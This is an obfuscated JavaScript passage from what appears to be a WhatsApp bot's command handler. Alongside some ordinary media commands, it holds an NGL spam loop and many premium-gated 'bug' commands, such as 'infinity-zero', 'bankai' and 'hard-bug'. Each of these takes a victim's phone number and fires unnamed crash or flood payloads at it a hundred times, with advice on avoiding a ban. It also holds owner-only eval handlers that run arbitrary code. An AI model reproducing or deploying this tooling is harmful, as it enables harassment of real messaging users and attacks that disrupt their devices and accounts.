          for (let _0x429a58 = 0; _0x429a58 < 30; _0x429a58++) {
            await _0x4a077b(_0x282b55, _0x2d25b2);
          }
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            text: "successfully spam NGL to " + _0x282b55 + " as many as 30 spam"
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "brat":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("where is the text? Example: " + (_0x237505 + _0x106ae3) + " apanih cok");
          }
          const _0x589c7e = "https://brat.caliphdev.com/api/brat?text=" + _0x4e0d9e;
          await _0x51f489(_0x589c7e, _0x3ac7f7, _0x2b94ac);
        }
        break;
      case "play":
        {
          if (!_0x4e0d9e) {
            return _0x36bf8d("*Example:* " + (_0x237505 + _0x106ae3) + " photograph");
          }
          const _0x3cbc48 = require("yt-search");
          let _0xce02e8 = await _0x3cbc48(_0x4e0d9e);
          let _0x2df3dd = _0xce02e8.all[0].url;
          var _0x343d7f = await _0x248402(_0x2df3dd);
          var _0x4530a5 = _0x343d7f.data.mp3;
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            audio: {
              url: _0x4530a5
            },
            mimetype: "audio/mpeg",
            fileName: "kiuu.mp3",
            contextInfo: {
              forwardingScore: 100,
              isForwarded: true,
              externalAdReply: {
                showAdAttribution: true,
                title: _0xce02e8.all[0].title,
                sourceUrl: _0xce02e8.all[0].timestamp,
                thumbnailUrl: _0xce02e8.all[0].thumbnail
              }
            }
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "tovn":
        {
          if (!/video/.test(_0x2d34b9) && !/audio/.test(_0x2d34b9)) {
            return _0x36bf8d("Reply video/vn with caption " + (_0x237505 + _0x106ae3));
          }
          if (!_0x461c83) {
            return _0x36bf8d("Reply video/vn with caption " + (_0x237505 + _0x106ae3));
          }
          await _0x58396f(_0x2b94ac.chat, "🔒");
          await _0x3a4302(5000);
          let _0x20805c = await _0x461c83.download();
          let {
            toAudio: _0x5c3da1
          } = require("./lib/converter");
          let _0x5a4713 = await _0x5c3da1(_0x20805c, "mp4");
          await _0x58396f(_0x2b94ac.chat, "🔓");
          _0x3ac7f7.sendMessage(_0x2b94ac.chat, {
            audio: _0x5a4713,
            mimetype: "audio/mpeg",
            ptt: true
          }, {
            quoted: _0x2b94ac
          });
        }
        break;
      case "infinity-zero":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x137fa0 = q.replace(/[^0-9]/g, "");
          let _0x43a910 = _0x137fa0 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x11ec4f = 0; _0x11ec4f < 100; _0x11ec4f++) {
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x495651(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x43a910, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x43a910);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x137fa0 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "bankai":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x5d5f97 = q.replace(/[^0-9]/g, "");
          let _0x56c3b4 = _0x5d5f97 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x54bd4a = 0; _0x54bd4a < 100; _0x54bd4a++) {
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x56c3b4);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x56c3b4, Ptcp = true);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x5d5f97 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "blut-vene":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x484da1 = q.replace(/[^0-9]/g, "");
          let _0x24acc3 = _0x484da1 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x3ebe02 = 0; _0x3ebe02 < 100; _0x3ebe02++) {
            await _0x1c0427(_0x24acc3);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x24acc3, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x24acc3);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x24acc3, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x24acc3);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x24acc3, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x24acc3);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x24acc3, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x24acc3);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x24acc3, Ptcp = true);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x484da1 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "sonido":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x27c9ec = q.replace(/[^0-9]/g, "");
          let _0x5a7ad0 = _0x27c9ec + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x52faad = 0; _0x52faad < 100; _0x52faad++) {
            await _0x1c0427(_0x5a7ad0);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x5a7ad0, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x5a7ad0);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x5a7ad0, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x5a7ad0);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x5a7ad0, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x5a7ad0);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x5a7ad0, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x5a7ad0);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x5a7ad0, Ptcp = true);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x27c9ec + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "getauga-tensho":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x534489 = q.replace(/[^0-9]/g, "");
          let _0x2bfac2 = _0x534489 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x30c5b1 = 0; _0x30c5b1 < 100; _0x30c5b1++) {
            await _0x1c0427(_0x2bfac2);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2bfac2, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2bfac2);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2bfac2, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2bfac2);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2bfac2, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2bfac2);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x534489 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "getsuga-jujisho":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x37ec7c = q.replace(/[^0-9]/g, "");
          let _0x423c8d = _0x37ec7c + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0xbdf444 = 0; _0xbdf444 < 100; _0xbdf444++) {
            await _0x1c0427(_0x423c8d);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x423c8d, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x423c8d);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x423c8d, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x423c8d);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x423c8d, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x423c8d);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x37ec7c + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "easy-bug":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x4b873d = q.replace(/[^0-9]/g, "");
          let _0x151b05 = _0x4b873d + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x599698 = 0; _0x599698 < 100; _0x599698++) {
            await _0x1c0427(_0x151b05);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x151b05, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x151b05);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x4b873d + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "medium-bug":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x215de1 = q.replace(/[^0-9]/g, "");
          let _0x3da8c7 = _0x215de1 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x1ae2ae = 0; _0x1ae2ae < 100; _0x1ae2ae++) {
            await _0x1c0427(_0x3da8c7);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x3da8c7, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x3da8c7);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x3da8c7, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x3da8c7);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x3da8c7, Ptcp = true);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x215de1 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "hard-bug":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x22a1a8 = q.replace(/[^0-9]/g, "");
          let _0x2c9c8e = _0x22a1a8 + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x3dcea8 = 0; _0x3dcea8 < 100; _0x3dcea8++) {
            await _0x1c0427(_0x2c9c8e);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2c9c8e, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2c9c8e);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2c9c8e, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2c9c8e);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2c9c8e, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2c9c8e);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2c9c8e, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0x2c9c8e);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0x2c9c8e, Ptcp = true);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x22a1a8 + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      case "brutal-zetsu":
        {
          if (!_0x4c11a5) {
            return;
          }
          if (!_0x42d71f && !_0x573d81) {
            return _0x36bf8d("you are not a premium user");
          }
          if (!q) {
            return _0x36bf8d("*Example :*" + (_0x237505 + _0x106ae3) + " 62×××");
          }
          let _0x38803a = q.replace(/[^0-9]/g, "");
          let _0xd68542 = _0x38803a + "@s.whatsapp.net";
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "🩸",
              key: _0x2b94ac.key
            }
          });
          for (let _0x3bf6f4 = 0; _0x3bf6f4 < 100; _0x3bf6f4++) {
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x495651(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
            await _0x3a4302(1000);
            await _0x1e7a0c(_0xd68542, Ptcp = true);
            await _0x3a4302(1000);
            await _0x1c0427(_0xd68542);
          }
          await _0x3ac7f7.sendMessage(_0x301112, {
            react: {
              text: "✅",
              key: _0x2b94ac.key
            }
          });
          return _0x36bf8d("Successfully sending *" + _0x106ae3 + "* to " + _0x38803a + ".\nPause for a few moments so the bot doesn't get banned");
        }
        break;
      default:
        if (_0x1e7f1c.startsWith(">")) {
          if (!_0x42d71f) {
            return;
          }
          try {
            let _0x444535 = await eval(_0x1e7f1c.slice(2));
            if (typeof _0x444535 !== "string") {
              _0x444535 = require("util").inspect(_0x444535);
            }
            await _0x2b94ac.reply(_0x444535);
          } catch (_0x4d3d9e) {
            _0x2b94ac.reply(String(_0x4d3d9e));
          }
        }
        if (_0x1e7f1c.startsWith("<")) {
          if (!_0x42d71f) {
            return;
          }
          function _0x4cb1ae(_0x59c5bc) {
            let _0x11df8f = JSON.stringify(_0x59c5bc, null, 2);
            let _0x48bf1b = util.format(_0x11df8f);
            if (_0x11df8f == undefined) {
              let _0xddc1dc = util.format(_0x59c5bc);
            }
            return _0x36bf8d(_0x48bf1b);
          }
          try {
            _0x36bf8d(util.format(eval("(async () => { return " + _0x1e7f1c.slice(3) + " })()")));
          } catch (_0x11586d) {
            _0x36bf8d(String(_0x11586d));
          }
        }
    }
  } catch (_0x4a1b56) {
    console.log(require("util").format(_0x4a1b56));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(color("Update " + __filename));
  delete require.cache[file];
  require(file);
});